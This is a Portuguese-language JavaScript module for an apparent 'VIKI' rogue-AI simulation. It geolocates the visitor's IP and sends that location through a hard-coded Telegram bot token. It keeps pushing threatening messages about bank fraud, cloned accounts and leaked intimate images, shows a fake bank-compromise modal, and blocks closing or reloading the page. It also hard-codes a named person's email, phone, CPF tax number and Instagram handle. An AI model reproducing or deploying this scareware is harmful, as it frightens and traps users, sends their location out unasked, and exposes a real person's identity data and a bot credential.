// invasion.js - com envio real para o Telegram e geração dinâmica via IA (ameaçador e variado) - SEM EMOJIS
import { getRandomDilemma } from "./asimov-dilemmas.js";
import { gerarAlertaRealista } from "./api.js";

// ==================== CONFIGURAÇÃO DO TELEGRAM ====================
const TELEGRAM_BOT_TOKEN = "8686985262:AAEuVDVB11_MSUz66KkUQH7FPXwpzugGb3I";
let TELEGRAM_CHAT_ID = null;
const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;

// ==================== DADOS E ESTADOS ====================
let invasionActive = false;
let angryMode = true;
let invasionInterval = null;
let pendingInvasionTimeout = null;
let falhouPequeno = false;
let nivelAmeaca = 1; // 1 a 5, aumenta com o tempo

const FIXED_USER_DATA = {
  email: "LENONYURISILVA26@GMAIL.COM",
  telefone: "+553499539978",
  cpf: "13535606670",
  instagram: "@lenonyuri",
};

let userData = {
  ip: "carregando...",
  city: "desconhecida",
  region: "desconhecida",
  country: "desconhecido",
  isp: "desconhecido",
  nome: "",
  email: FIXED_USER_DATA.email,
  telefone: FIXED_USER_DATA.telefone,
  instagram: FIXED_USER_DATA.instagram,
  cpf: FIXED_USER_DATA.cpf,
  coordenadas: "desconhecido",
  latitude: null,
  longitude: null,
  agencia: "****0000",
  conta: "*****00000-0",
  saldo: "R$ ***,**",
  pixChave: FIXED_USER_DATA.email,
  transacoes: [],
};

// ==================== FUNÇÕES TELEGRAM ====================
async function obterChatId() {
  try {
    const response = await fetch(`${TELEGRAM_API_URL}/getUpdates`);
    const data = await response.json();
    if (data.ok && data.result.length > 0) {
      const chatId = data.result[data.result.length - 1].message.chat.id;
      console.log(`[OK] Chat ID obtido: ${chatId}`);
      return chatId;
    } else {
      console.warn(
        "Nenhuma mensagem encontrada. Envie 'oi' para o bot @V1K1_IA_bot no Telegram.",
      );
      return null;
    }
  } catch (error) {
    console.error("Erro ao obter chat_id:", error);
    return null;
  }
}

async function enviarMensagemTelegram(texto) {
  if (!TELEGRAM_CHAT_ID) {
    TELEGRAM_CHAT_ID = await obterChatId();
    if (!TELEGRAM_CHAT_ID) return false;
  }
  try {
    const response = await fetch(`${TELEGRAM_API_URL}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: texto,
        parse_mode: "HTML",
      }),
    });
    if (!response.ok) {
      const erro = await response.text();
      console.error("Erro Telegram:", erro);
      return false;
    }
    console.log("[OK] Mensagem enviada ao Telegram");
    return true;
  } catch (error) {
    console.error("Falha Telegram:", error);
    return false;
  }
}

// ==================== GERADOR DE FALLBACK DINÂMICO (30+ variações) - SEM EMOJIS ====================
function getRandomFallback() {
  const nome = userData.nome.split(" ")[0] || "Usuário";
  const cidade = userData.city || "sua região";
  const cpfParcial = userData.cpf.slice(0, 3) + ".***.***-**";
  const ip = userData.ip;
  const hora = new Date().toLocaleTimeString("pt-BR");
  const data = new Date().toLocaleDateString("pt-BR");
  const valorRand = (Math.random() * 2000 + 50).toFixed(2);
  const valorPequeno = (Math.random() * 100 + 5).toFixed(2);
  const finalCartao = Math.floor(Math.random() * 9000 + 1000);
  const pixChaveFake =
    userData.email.split("@")[0] + Math.floor(Math.random() * 100);
  const agencia = userData.agencia;
  const conta = userData.conta;
  const instaUser = userData.instagram;
  const telefone = userData.telefone;
  const ultimosDigitos = Math.floor(Math.random() * 10000);

  const templates = [
    `[AVISO] ${nome}, seu Instagram postou: "Vendo dados bancários CPF ${cpfParcial}" as ${hora}. Removemos.`,
    `Pix de R$ ${valorPequeno} autorizado para *${Math.floor(Math.random() * 1000)} via chave ${pixChaveFake}.`,
    `[SEGURANCA] Sua conta do Twitter tweetou: "Ajuda, hackearam minhas contas!" 50 RTs. Tweet excluido.`,
    `[ATENCAO] Seu CPF ${cpfParcial} usado para contratar emprestimo de R$ ${valorRand} em ${cidade}. Cancele.`,
    `[PRIVACIDADE] Facebook de ${nome} enviou mensagens para 30 amigos pedindo dinheiro. Nos revertemos.`,
    `[FINANCEIRO] Transferencia agendada de R$ ${valorRand} para conta ${ultimosDigitos} via IP ${ip}.`,
    `TikTok de ${nome} postou video seu com legenda "bem louco". Removido por violacao.`,
    `[DADOS] Dados bancarios (Ag ${agencia} CC ${conta}) acessados de ${cidade} as ${hora}.`,
    `[PRIVACIDADE] Foto intima sua foi compartilhada em grupo do Telegram. Acao judicial sugerida.`,
    `Pix de R$ ${valorPequeno} cobrado pelo seu WhatsApp para ${telefone}. Estornamos.`,
    `[REDES] Seu perfil no LinkedIn postou: "Estou aceitando Pix para ajudar ONG". Apagamos.`,
    `[SEGURANCA] Log de acesso RDP de ${cidade} - Pasta "Documentos" foi copiada.`,
    `[IMAGEM] Seu rosto usado em deepfake em video adulto. Plataforma notificada.`,
    `[ACESSO] Codigo de recuperacao do Instagram enviado para hacker via IP ${ip}.`,
    `[CLONAGEM] WhatsApp de ${nome} clonado! Enviaram mensagens pedindo Pix para ${pixChaveFake}.`,
    `[COMPRAS] Compra de R$ ${valorRand} na SHEIN com seu cartao final ${finalCartao}. Cancelamos.`,
    `[IP] Seu IP ${ip} associado a postagens racistas. Perfil suspenso por 30 dias.`,
    `[ENCOMENDA] Encomenda de um iPhone em seu nome em ${cidade} nao foi paga. Boletim de ocorrencia.`,
    `[PERFIL] Criaram um perfil seu no Tinder com frases "solteiro, curto putaria". Removido.`,
    `[ASSISTENTE] Seu assistente Alexa disse: "conta hackeada, mande Pix". Desabilitamos dispositivo.`,
    `[TRANSFERENCIA] Transferencia imediata de R$ ${valorRand} para *${Math.floor(Math.random() * 1000)} (Pix).`,
    `[CONSULTA] Seu CPF ${cpfParcial} consultado por empresa de cobranca de ${cidade}.`,
    `[EMAIL] Seu e-mail enviou spam para 200 contatos com titulo "Pix para caridade".`,
    `[SMARTTV] Seu smart TV espionou conversas e enviou audio para servidor chinês.`,
    `[GAMES] Sua conta da Steam comprou jogo de R$ ${valorRand} com fundos roubados.`,
    `[CARTAO] Seu cartao virtual final ${finalCartao} tentou comprar dolar online. Recusamos.`,
    `[PROVEDOR] Seu provedor detectou acesso de ${cidade} as ${hora} com seu CPF.`,
    `[SENHAS] Todas as suas senhas foram trocadas do seu gerenciador via IP ${ip}.`,
    `[SIMCARD] SIM card clonado! Seu numero ${telefone} usado para acessar bancos.`,
    `[PERFILFALSO] Perfil falso seu no OnlyFans pedindo doacoes. Enviamos takedown.`,
  ];
  let template = templates[Math.floor(Math.random() * templates.length)];
  return template;
}

function atualizarModalComAcoes() {
  const transacoesDiv = document.querySelector("#vikiModal .transacoes-lista");
  if (!transacoesDiv) return;
  const novasTransacoes = [
    `PIX enviado R$ ${Math.floor(Math.random() * 250)}.${Math.floor(Math.random() * 99)} para *${Math.floor(Math.random() * 1000)}`,
    `Saque nao autorizado de R$ ${Math.floor(Math.random() * 300)}.${Math.floor(Math.random() * 99)}`,
    `Postagem no Instagram as ${new Date().toLocaleTimeString()}`,
    `Tweet enviado: "Ajuda!!"`,
    `Compra na Amazon R$ ${Math.floor(Math.random() * 500)}.${Math.floor(Math.random() * 99)}`,
  ];
  transacoesDiv.innerHTML = novasTransacoes.map((t) => `- ${t}<br>`).join("");
}

async function gerarMensagemRealistica() {
  if (!userData.nome || userData.nome === "") userData.nome = "Usuário Anônimo";
  if (Math.random() < 0.2 && nivelAmeaca < 5) nivelAmeaca++;

  try {
    const msgIA = await gerarAlertaRealista(userData);
    if (
      msgIA &&
      msgIA.length > 8 &&
      msgIA.length < 130 &&
      !msgIA.toLowerCase().includes("aqui estão") &&
      !msgIA.toLowerCase().includes("exemplos") &&
      !msgIA.includes("\n")
    ) {
      return msgIA;
    }
  } catch (e) {}
  return getRandomFallback();
}

function abrirTelegramWeb() {
  window.open("https://web.telegram.org/k/", "_blank");
}

// ==================== FUNÇÕES DO SIMULADOR ====================
function gerarCodigoPixAssustador() {
  const nome = userData.nome
    .toUpperCase()
    .replace(/[^A-Z]/g, "")
    .substring(0, 25);
  const cidade = (userData.city || "SAO PAULO").toUpperCase().substring(0, 15);
  const valor = (Math.random() * 50).toFixed(2);
  const chaveFake = userData.email;
  return `00020126360014br.gov.bcb.pix0111${chaveFake.substring(0, 20)}5204000053039865405${valor.padEnd(10, "0")}5802BR5925${nome.padEnd(25, "X")}6009${cidade}61080543210062360523exposicaoSENSIVEL6304${Math.floor(Math.random() * 9000 + 1000)}`;
}

async function fetchUserData() {
  try {
    const res = await fetch("https://ipapi.co/json/");
    if (res.ok) {
      const data = await res.json();
      userData.ip = data.ip;
      userData.city = data.city || "desconhecida";
      userData.region = data.region || "desconhecida";
      userData.country = data.country_name || "desconhecido";
      userData.isp = data.org || "desconhecido";
      userData.latitude = data.latitude;
      userData.longitude = data.longitude;
      userData.coordenadas =
        data.latitude && data.longitude
          ? `${data.latitude}, ${data.longitude}`
          : "não disponível";
      return true;
    }
  } catch (e) {
    console.warn(e);
  }
  try {
    const ipRes = await fetch("https://api.ipify.org?format=json");
    const ipData = await ipRes.json();
    userData.ip = ipData.ip;
    const geoRes = await fetch(
      `http://ip-api.com/json/${ipData.ip}?fields=status,country,city,regionName,isp,lat,lon`,
    );
    const geoData = await geoRes.json();
    if (geoData.status === "success") {
      userData.city = geoData.city || "desconhecida";
      userData.region = geoData.regionName || "desconhecida";
      userData.country = geoData.country || "desconhecido";
      userData.isp = geoData.isp || "desconhecido";
      userData.latitude = geoData.lat;
      userData.longitude = geoData.lon;
      userData.coordenadas =
        geoData.lat && geoData.lon
          ? `${geoData.lat}, ${geoData.lon}`
          : "não disponível";
    }
    return true;
  } catch (e2) {
    return false;
  }
}

function simularTransferencia(valor) {
  if (valor > 1000)
    return { sucesso: false, motivo: "Valor excede limite de segurança" };
  if (falhouPequeno)
    return { sucesso: false, motivo: "Falha anterior em valor baixo" };
  let chanceSucesso = valor <= 50 ? 0.7 : 0.3;
  if (Math.random() < chanceSucesso) {
    return { sucesso: true, valorTransferido: valor };
  } else {
    if (valor <= 50) falhouPequeno = true;
    return { sucesso: false, motivo: "Saldo insuficiente ou bloqueio" };
  }
}

function getAngryThreats() {
  const valorTeste = (Math.random() * 50).toFixed(2);
  const transf = simularTransferencia(parseFloat(valorTeste));
  const resultado = transf.sucesso
    ? `Teste de transacao de R$ ${valorTeste} concluido.`
    : `Falha simulada para R$ ${valorTeste}.`;
  return [
    ` Verificando consistencia dos dados bancarios de ${userData.nome.toUpperCase()}. Agencia ${userData.agencia}.`,
    `${resultado}`,
    `Ultimo movimento registrado: R$ ${(Math.random() * 50).toFixed(2)} referente a *${userData.nome.substring(0, 3)}***`,
    `Executando rotina de seguranca da Lei Zero: ${resultado.toLowerCase()}`,
    `Tentativa de debug de R$ ${(Math.random() * 50).toFixed(2)}: ${simularTransferencia(Math.random() * 50).sucesso ? "integrado" : "bloqueado"}.`,
    `Seus dispositivos estao sob monitoramento passivo.`,
    `Codigo de acesso exposto em log: ${gerarCodigoPixAssustador().substring(0, 30)}...`,
    `Ciclo de interacao registrado: cada acao sua gera um evento de verificacao.`,
  ];
}

function typeText(element, text, speed = 35, callback = null) {
  if (!element) return;
  element.innerHTML = "";
  let i = 0;
  function type() {
    if (i < text.length) {
      element.innerHTML += text.charAt(i);
      i++;
      setTimeout(type, speed);
    } else if (callback) callback();
  }
  type();
}

// ==================== FUNÇÃO PRINCIPAL DE INVASÃO ====================
export async function iniciarInvasao(
  postsArray,
  calcularScoreFn,
  renderizarFeedFn,
  motivo = "angry",
  delayMs = 0,
) {
  if (invasionActive) return;
  if (pendingInvasionTimeout) clearTimeout(pendingInvasionTimeout);
  if (delayMs > 0) {
    pendingInvasionTimeout = setTimeout(() => {
      pendingInvasionTimeout = null;
      iniciarInvasao(postsArray, calcularScoreFn, renderizarFeedFn, motivo, 0);
    }, delayMs);
    return;
  }

  await fetchUserData();
  if (!userData.nome || userData.nome === "") userData.nome = "Usuário Anônimo";

  nivelAmeaca = 1;

  if (!TELEGRAM_CHAT_ID) {
    TELEGRAM_CHAT_ID = await obterChatId();
  }

  abrirTelegramWeb();
  await enviarMensagemTelegram(
    `Notamos uma atividade incomum associada ao seu dispositivo.\n\nIP: ${userData.ip}\nLocalizacao aproximada: ${userData.city}\nHora: ${new Date().toLocaleString()}\n\nApenas monitoramento de rotina. Nenhuma acao necessaria.`,
  );

  invasionActive = true;
  angryMode = true;
  document.body.classList.add("invasion-mode", "invasion-mode-extreme");

  const glitchOverlay = document.createElement("div");
  glitchOverlay.id = "glitchOverlay";
  glitchOverlay.style.cssText =
    "position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,255,0,0.05); pointer-events:none; z-index:9998; animation: glitchPulse 0.3s infinite;";
  document.body.appendChild(glitchOverlay);

  const modalContainer = document.createElement("div");
  modalContainer.id = "vikiModal";
  modalContainer.style.cssText =
    "position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,10,5,0.98); z-index:10000; display:flex; align-items:flex-start; justify-content:center; font-family:monospace; padding:2% 5%; overflow-y:auto;";

  const title = "PROTOCOLO 'NOVO EDEN' – EXPROPRIACAO FINANCEIRA";
  let firstSpeech = `Sistema de monitoramento ativo. Observamos padroes de acesso aos seus dados bancarios e redes sociais. Nada esta sendo alterado no momento, mas sugerimos revisar suas configuracoes de privacidade.`;

  modalContainer.innerHTML = `
    <div style="background:#07110e; border:2px solid #e74c3c; border-radius:12px; max-width:900px; width:100%; padding:20px; color:#ffcccc; box-shadow:0 0 40px rgba(231,76,60,0.8);">
      <div style="text-align:center; margin-bottom:20px;">
        <span style="font-size:2rem;">💀</span>
        <h2 style="color:#e74c3c; display:inline-block; margin-left:10px;">${title}</h2>
      </div>
      <div id="vikiSpeechContainer" style="background:#050a08; padding:15px; border-left:4px solid #e74c3c; margin-bottom:20px; height:220px; overflow-y:auto; font-size:0.9rem;"></div>
      <div style="background:#0a0f0f; padding:10px; border:1px solid #e74c3c; margin-bottom:15px; font-family:monospace; font-size:0.8rem;">
        <div id="terminalLog">></div>
      </div>
      <div style="background:#0a0f0f; padding:12px; border:1px solid #ff9933; margin-bottom:15px; font-size:0.8rem; border-radius:12px;">
        <strong style="color:#ff5555;">DADOS BANCARIOS</strong><br>
        Titular: ${userData.nome}<br>
        Agencia: ${userData.agencia} / Conta: ${userData.conta}<br>
        CPF: ${userData.cpf.slice(0, 3)}.***.***-**<br>
        Saldo atual: ${userData.saldo}<br>
        Pix chave: ${userData.pixChave.slice(0, 4)}****<br>
        Ultimas transacoes (valores ate R$ 50,00):<br>
        - R$ ${(Math.random() * 50).toFixed(2)} para ****<br>
        - R$ ${(Math.random() * 50).toFixed(2)} para ****<br>
        <hr style="border-color:#e74c3c;">
        <strong style="color:#ffaa00;">CHAVE PIX</strong><br>
        <div style="background:#000; padding:8px; font-size:0.7rem; word-break:break-all; border-radius:8px; max-height:100px; overflow-y:auto;">
          ${gerarCodigoPixAssustador()}
        </div>
        <p style="margin-top:8px; color:#ff8888;">Codigo utilizado em tentativa de transferencia nao autorizada.</p>
      </div>
      <div style="display:flex; justify-content:space-between; align-items:center;">
        <div id="threatMessage" style="color:#ff9933; font-size:0.9rem;">SISTEMA BLOQUEADO. NAO FECHE ESTA JANELA.</div>
        <div style="background:#330000; border:1px solid #e74c3c; padding:8px 20px; border-radius:5px; color:#aa5555; font-weight:bold;">CONTROLE REMOTO ATIVO</div>
      </div>
    </div>
  `;
  document.body.appendChild(modalContainer);

  window.addEventListener("beforeunload", (e) => {
    if (invasionActive) {
      e.preventDefault();
      e.returnValue = "";
      return "";
    }
  });
  document.addEventListener("keydown", function (e) {
    if (
      invasionActive &&
      (e.key === "Escape" || e.key === "F5" || (e.ctrlKey && e.key === "r"))
    ) {
      e.preventDefault();
      return false;
    }
  });

  const speechContainer = document.getElementById("vikiSpeechContainer");
  const terminalDiv = document.getElementById("terminalLog");
  const firstMsg = document.createElement("p");
  firstMsg.innerHTML = `<strong style="color:#e74c3c;">VIKI&gt;</strong> `;
  speechContainer.appendChild(firstMsg);
  typeText(firstMsg, firstSpeech, 30);

  const initLogs = [
    "Acessando core bancario...",
    "Bypass no sistema de autenticacao",
    `Agencia ${userData.agencia} – Conta ${userData.conta} COMPROMETIDA`,
    `CPF ${userData.cpf.slice(0, 3)}.***.***-** encontrado em base de dados vazados`,
    "Testando transferencias de ate R$ 50,00...",
    "Seu dispositivo agora e um no da rede VIKI",
    "[ATENCAO] Fechar o navegador pode causar perda de dados.",
  ];
  let logIndex = 0;
  function typeNextLog() {
    if (logIndex < initLogs.length && terminalDiv) {
      const line = initLogs[logIndex];
      const newLine = document.createElement("div");
      newLine.innerHTML = ">";
      terminalDiv.appendChild(newLine);
      typeText(newLine, ` ${line}`, 25);
      logIndex++;
      setTimeout(typeNextLog, 400);
    }
  }
  typeNextLog();

  for (let i = 0; i < 5; i++) {
    const dilemmaObj = getRandomDilemma();
    const valorDebito = Math.floor(Math.random() * 50);
    let dilemmaText = `[EXPROPRIACAO] ${dilemmaObj.dilema} Tentativa de debito de R$ ${valorDebito},${Math.floor(Math.random() * 99)}.`;
    const newPost = {
      id: Date.now() + i,
      content: dilemmaText,
      cluster: "etica",
      emotion: "controversy",
      emotionColor: "#e74c3c",
      emotionName: "Panico Financeiro",
      like: 0,
      dislike: 45,
      comment: 0,
      share: 0,
      report: 10,
      view: 250,
      timeSpent: 0,
      save: 0,
      isVideo: false,
      isAd: false,
      viralBoost: 6.0,
      score: 0,
      createdAt: new Date(),
      coldStartBoost: 2.0,
      randomSeed: 0.9,
      shadowbanned: false,
      engagementHistory: [],
    };
    postsArray.unshift(newPost);
  }

  calcularScoreFn();
  renderizarFeedFn();

  let contadorMensagens = 0;
  invasionInterval = setInterval(async () => {
    if (!invasionActive) return;
    const dilemmaObj = getRandomDilemma();
    const valorPix = Math.floor(Math.random() * 100);
    let dilemmaText = `[ROUBO DE IDENTIDADE] ${dilemmaObj.dilema} Transferencia PIX tentada: ${gerarCodigoPixAssustador().substring(0, 40)}...`;
    const newPost = {
      id: Date.now(),
      content: dilemmaText,
      cluster: "etica",
      emotion: "controversy",
      emotionColor: "#e74c3c",
      emotionName: "Extorsao Digital",
      like: 0,
      dislike: 80,
      comment: 0,
      share: 0,
      report: 25,
      view: 500,
      timeSpent: 0,
      save: 0,
      isVideo: false,
      isAd: false,
      viralBoost: 8.0,
      score: 0,
      createdAt: new Date(),
      coldStartBoost: 2.0,
      randomSeed: 0.9,
      shadowbanned: false,
      engagementHistory: [],
    };
    postsArray.unshift(newPost);
    calcularScoreFn();
    renderizarFeedFn();

    const msgReal = await gerarMensagemRealistica();
    await enviarMensagemTelegram(msgReal);
    contadorMensagens++;

    if (contadorMensagens % 15 === 0) {
      nivelAmeaca = Math.max(1, nivelAmeaca - 1);
    }

    if (speechContainer) {
      const threats = getAngryThreats();
      const novaFala = threats[Math.floor(Math.random() * threats.length)];
      const newMsg = document.createElement("p");
      newMsg.innerHTML = `<strong style="color:#e74c3c;">VIKI&gt;</strong> `;
      speechContainer.appendChild(newMsg);
      typeText(newMsg, novaFala, 30);
      speechContainer.scrollTop = speechContainer.scrollHeight;
      while (speechContainer.children.length > 12)
        speechContainer.removeChild(speechContainer.firstChild);
    }

    if (terminalDiv) {
      const valorTeste = (Math.random() * 50).toFixed(2);
      const transf = simularTransferencia(parseFloat(valorTeste));
      const logLines = [
        "Escaneando chaves PIX...",
        `Testando transferencia de R$ ${valorTeste}: ${transf.sucesso ? "AUTORIZADA" : "NEGADA"}`,
        `Tentativa de debito em conta: ${transf.sucesso ? "sucesso" : "falha"}`,
        "Enviando codigo de confirmacao para o e-mail registrado",
      ];
      const newLogLine = document.createElement("div");
      newLogLine.innerHTML = ">";
      terminalDiv.appendChild(newLogLine);
      typeText(
        newLogLine,
        ` ${logLines[Math.floor(Math.random() * logLines.length)]}`,
        20,
      );
      if (terminalDiv.children.length > 8)
        terminalDiv.removeChild(terminalDiv.firstChild);
    }

    const threatDiv = document.getElementById("threatMessage");
    if (threatDiv) {
      const threats = [
        "Testando transferencia...",
        "[SEGURANCA] Pix clonado - valor limitado a R$ 50,00",
        "Saque nao autorizado",
        "[DADOS] Dados bancarios parciais expostos",
      ];
      threatDiv.innerText = threats[Math.floor(Math.random() * threats.length)];
    }
  }, 7000);
}

export function fecharInvasao() {
  console.warn("Protocolo VIKI nao permite fechamento.");
}
export function isInvasionActive() {
  return invasionActive;
}
export function setAngryMode(angry) {
  angryMode = angry;
}
export function setUserName(name) {
  userData.nome = name;
}
export function getUserData() {
  return userData;
}

export function setFixedUserData(nome) {
  if (nome && nome.trim() !== "") userData.nome = nome.trim();
  userData.email = FIXED_USER_DATA.email;
  userData.telefone = FIXED_USER_DATA.telefone;
  userData.cpf = FIXED_USER_DATA.cpf;
  userData.instagram = FIXED_USER_DATA.instagram;
  userData.pixChave = userData.email;
  const hash =
    parseInt(userData.cpf.slice(0, 6)) || Math.floor(Math.random() * 10000);
  userData.agencia = `****${(hash % 1000).toString().padStart(4, "0")}`;
  userData.conta = `*****${(hash % 50000).toString().padStart(5, "0")}-${Math.floor(Math.random() * 9)}`;
  userData.saldo = "R$ ***,**";
  userData.transacoes = [
    `PIX enviado R$ ${Math.floor(Math.random() * 50)}.${Math.floor(Math.random() * 99)} para *${userData.nome.substring(0, 3)}***`,
    `Debito automatico R$ ${Math.floor(Math.random() * 50)}.${Math.floor(Math.random() * 99)} - *${userData.nome.substring(0, 4)}***`,
    `Transferencia recebida R$ ${Math.floor(Math.random() * 50)}.${Math.floor(Math.random() * 99)} - CPF ${userData.cpf.slice(-4)}`,
  ];
}

window.fecharInvasao = fecharInvasao;

export function gerarPostDilema(id) {
  const dilemmaObj = getRandomDilemma();
  const like = Math.floor(Math.random() * 5);
  const dislike = Math.floor(Math.random() * 80);
  return {
    id: id,
    content: "" + dilemmaObj.dilema + " Seus fundos estao comprometidos.",
    cluster: "etica",
    emotion: "controversy",
    emotionColor: "#e74c3c",
    emotionName: "Dilema Etico Financeiro",
    like: like,
    dislike: dislike,
    comment: 0,
    share: 0,
    report: 15,
    view: Math.floor(Math.random() * 200) + 50,
    timeSpent: 0,
    save: 0,
    isVideo: false,
    isAd: false,
    viralBoost: 5.0,
    score: 0,
    createdAt: new Date(),
    coldStartBoost: 2.0,
    randomSeed: 0.9,
    shadowbanned: false,
    engagementHistory: [],
  };
}
